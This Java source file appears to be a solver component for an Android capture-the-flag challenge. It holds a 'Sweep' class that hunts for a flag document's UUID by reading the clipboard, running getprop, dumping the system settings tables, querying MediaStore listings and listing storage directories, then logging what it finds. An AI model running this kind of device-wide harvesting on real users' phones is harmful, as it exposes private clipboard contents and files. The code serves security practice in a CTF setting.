package xyz.ariadnetab.solver;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.LinkedHashSet;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Hunt for the flag document's UUID anywhere on the device that an unprivileged
 * app can read. The whole web chain is blocked on that one string: documents/list
 * is owner-scoped to the bot and its bearer never leaves the app origin.
 */
public final class Sweep {

    /** Canonical lowercase UUID, which is the only shape OpenDocumentActivity accepts. */
    private static final Pattern UUID_RE = Pattern.compile(
            "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}");

    private final Set<String> seen = new LinkedHashSet<>();

    public void run(Context context) {
        MainActivity.log("=== sweep start ===");
        clipboard(context);
        properties();
        settings(context);
        mediaStore(context);
        files();
        report();
        MainActivity.log("=== sweep end ===");
    }

    /** Harvest every canonical UUID out of one blob and say where it came from. */
    private void harvest(String source, String text) {
        if (text == null) return;
        Matcher matcher = UUID_RE.matcher(text.toLowerCase(java.util.Locale.ROOT));
        while (matcher.find()) {
            String value = matcher.group();
            if (seen.add(value)) MainActivity.log("UUID " + source + " " + value);
        }
    }

    private void report() {
        MainActivity.log("sweep uuids=" + seen.size() + " " + seen);
    }

    private void clipboard(Context context) {
        try {
            ClipboardManager manager =
                    (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = manager.getPrimaryClip();
            if (clip == null) {
                MainActivity.log("clip null");
                return;
            }
            for (int index = 0; index < clip.getItemCount(); index++) {
                CharSequence text = clip.getItemAt(index).coerceToText(context);
                String value = text == null ? "" : text.toString();
                MainActivity.log("clip[" + index + "] " + value);
                harvest("clip", value);
            }
        } catch (Throwable error) {
            MainActivity.log("clip FAILED " + error);
        }
    }

    /** A setup script that wanted to hand the phone a value would plausibly use a
     *  system property, and getprop is readable by any app. */
    private void properties() {
        String output = exec(new String[] {"getprop"});
        if (output == null) return;
        for (String line : output.split("\n")) {
            String lower = line.toLowerCase(java.util.Locale.ROOT);
            if (lower.contains("ariadne") || lower.contains("tfc") || lower.contains("flag")
                    || lower.contains("doc") || lower.contains("bot")) {
                MainActivity.log("prop " + line.trim());
            }
        }
        harvest("prop", output);
    }

    private void settings(Context context) {
        for (String table : new String[] {"global", "secure", "system"}) {
            try (Cursor cursor = context.getContentResolver().query(
                    Uri.parse("content://settings/" + table), null, null, null, null)) {
                if (cursor == null) {
                    MainActivity.log("settings " + table + " null cursor");
                    continue;
                }
                StringBuilder builder = new StringBuilder();
                while (cursor.moveToNext()) {
                    for (int column = 0; column < cursor.getColumnCount(); column++) {
                        try {
                            builder.append(cursor.getString(column)).append(' ');
                        } catch (Throwable ignored) {
                            // A blob column is not text; skip it.
                        }
                    }
                    builder.append('\n');
                }
                harvest("settings-" + table, builder.toString());
            } catch (Throwable error) {
                MainActivity.log("settings " + table + " FAILED " + error);
            }
        }
    }

    private void mediaStore(Context context) {
        Uri[] targets = {
            android.provider.MediaStore.Files.getContentUri("external"),
            android.provider.MediaStore.Downloads.EXTERNAL_CONTENT_URI
        };
        for (Uri target : targets) {
            try (Cursor cursor = context.getContentResolver().query(
                    target, new String[] {"_display_name", "_data"}, null, null, null)) {
                if (cursor == null) {
                    MainActivity.log("media " + target + " null cursor");
                    continue;
                }
                StringBuilder builder = new StringBuilder();
                while (cursor.moveToNext() && builder.length() < 6000) {
                    builder.append(cursor.getString(0)).append('|')
                           .append(cursor.getString(1)).append('\n');
                }
                MainActivity.log("media " + target + " -> " + builder);
                harvest("media", builder.toString());
            } catch (Throwable error) {
                MainActivity.log("media " + target + " FAILED " + error);
            }
        }
    }

    private void files() {
        String[] roots = {
            "/sdcard", "/sdcard/Download", "/sdcard/Documents",
            "/data/local/tmp", "/data/local", "/mnt/sdcard"
        };
        for (String root : roots) {
            try {
                File directory = new File(root);
                String[] names = directory.list();
                MainActivity.log("ls " + root + " -> "
                        + (names == null ? "null" : java.util.Arrays.toString(names)));
                if (names != null) harvest("ls-" + root, java.util.Arrays.toString(names));
            } catch (Throwable error) {
                MainActivity.log("ls " + root + " FAILED " + error);
            }
        }
        try {
            File external = Environment.getExternalStorageDirectory();
            MainActivity.log("extdir " + external + " readable=" + external.canRead());
        } catch (Throwable error) {
            MainActivity.log("extdir FAILED " + error);
        }
    }

    private static String exec(String[] command) {
        try {
            Process process = new ProcessBuilder(command).redirectErrorStream(true).start();
            StringBuilder builder = new StringBuilder();
            try (BufferedReader reader =
                         new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null && builder.length() < 200000) {
                    builder.append(line).append('\n');
                }
            }
            process.waitFor();
            return builder.toString();
        } catch (Throwable error) {
            MainActivity.log("exec " + command[0] + " FAILED " + error);
            return null;
        }
    }
}
